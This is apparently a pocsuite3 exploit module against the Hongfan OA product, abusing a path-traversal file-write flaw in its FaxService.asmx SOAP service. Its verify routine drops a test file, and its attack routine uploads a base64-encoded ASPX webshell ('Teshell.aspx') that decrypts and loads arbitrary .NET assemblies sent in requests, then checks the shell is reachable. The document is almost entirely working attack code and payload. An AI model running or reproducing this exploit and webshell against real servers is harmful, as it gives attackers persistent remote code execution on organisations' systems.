from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '红帆OA FaxService.asmx任意文件写入'
    appName = '红帆 OA'
    appVersion = 'All'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''None'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self, verify=True):
        result = {}
        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': '"http://tempuri.org/SaveConvertTif"',
        }
        data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveConvertTif xmlns="http://tempuri.org/">
      <FaxID>1</FaxID>
      <Pages>2</Pages>
      <FileName>../../../../2.txt</FileName>
      <FileContent>dGVzdDEyMw==</FileContent>
    </SaveConvertTif>
  </soap:Body>
</soap:Envelope>'''
        vul_url = self.url+"/iOffice/prg/set/wss/FaxService.asmx"
        resp = requests.post(vul_url,headers=headers,data=data,allow_redirects=False,verify=False,timeout=10)
        if resp.status_code == 200 and "SaveConvertTifResponse" in resp.text:
            path1 = '/iOffice/2.txt'
            vul_url1= self.url+path1
            resp1 = requests.get(vul_url1,headers=headers,allow_redirects=False,verify=False,timeout=10)
            if resp1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = vul_url1
        return self.parse_output(result)

    def _attack(self):
        result={}
        headers = {
            'Content-Type': 'text/xml; charset=utf-8',
            'SOAPAction': '"http://tempuri.org/SaveConvertTif"',
        }
        data = '''<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <SaveConvertTif xmlns="http://tempuri.org/">
      <FaxID>1</FaxID>
      <Pages>2</Pages>
      <FileName>../../../../Teshell.aspx</FileName>
      <FileContent>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlQEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5SZWZsZWN0aW9uIiU+PCVTZXNzaW9uLkFkZCgiayIsImU0NWUzMjlmZWI1ZDkyNWIiKTsgLyror6Xlr4bpkqXkuLrov57mjqXlr4bnoIEzMuS9jW1kNeWAvOeahOWJjTE25L2N77yM6buY6K6k6L+e5o6l5a+G56CBcmViZXlvbmQqL2J5dGVbXSBrID0gRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhTZXNzaW9uWzBdICsgIiIpLGMgPSBSZXF1ZXN0LkJpbmFyeVJlYWQoUmVxdWVzdC5Db250ZW50TGVuZ3RoKTtBc3NlbWJseS5Mb2FkKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZURlY3J5cHRvcihrLCBrKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGMsIDAsIGMuTGVuZ3RoKSkuQ3JlYXRlSW5zdGFuY2UoIlUiKS5FcXVhbHModGhpcyk7JT4K</FileContent>
    </SaveConvertTif>
  </soap:Body>
</soap:Envelope>'''
        vul_url = self.url+"/iOffice/prg/set/wss/FaxService.asmx"
        resp = requests.post(vul_url,headers=headers,data=data,allow_redirects=False,verify=False,timeout=10)
        if resp.status_code == 200 and "SaveConvertTifResponse" in resp.text:
            path1 = '/iOffice/Teshell.aspx'
            vul_url1= self.url+path1
            resp1 = requests.get(vul_url1,headers=headers,allow_redirects=False,verify=False,timeout=10)
            if resp1.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = vul_url1
        return self.parse_output(result)
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
